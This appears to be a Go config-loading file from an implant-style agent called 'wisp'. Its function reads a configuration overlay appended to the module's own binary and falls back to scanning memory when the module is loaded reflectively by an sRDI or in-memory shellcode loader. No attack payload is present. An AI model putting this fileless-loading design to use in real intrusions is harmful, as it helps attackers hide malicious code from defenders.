package config

import (
	"bytes"
	"os"

	"github.com/user/wisp/shared/protocol"
)

// loadOverlayConfig reads the config overlay appended to the end of the running
// module. For a standalone executable that is os.Executable(); for a DLL loaded
// by a host process it must be the DLL's own file (see selfpath_windows_cgo.go),
// because os.Executable() returns the host process's EXE path in that case.
//
// When the module was loaded reflectively (sRDI / in-memory shellcode loader)
// there is no on-disk file, so we fall back to scanning the module's own image
// memory for the overlay (Windows only; loadOverlayConfigFromMemory is a stub
// elsewhere).
func loadOverlayConfig() (string, error) {
	path, err := selfBinaryPath()
	if err == nil {
		data, rerr := os.ReadFile(path)
		if rerr == nil {
			if idx := bytes.LastIndex(data, protocol.OverlayMarker); idx >= 0 {
				return string(data[idx+len(protocol.OverlayMarker):]), nil
			}
		}
	}
	// File path unavailable (reflective load) or no marker on disk: scan memory.
	return loadOverlayConfigFromMemory()
}
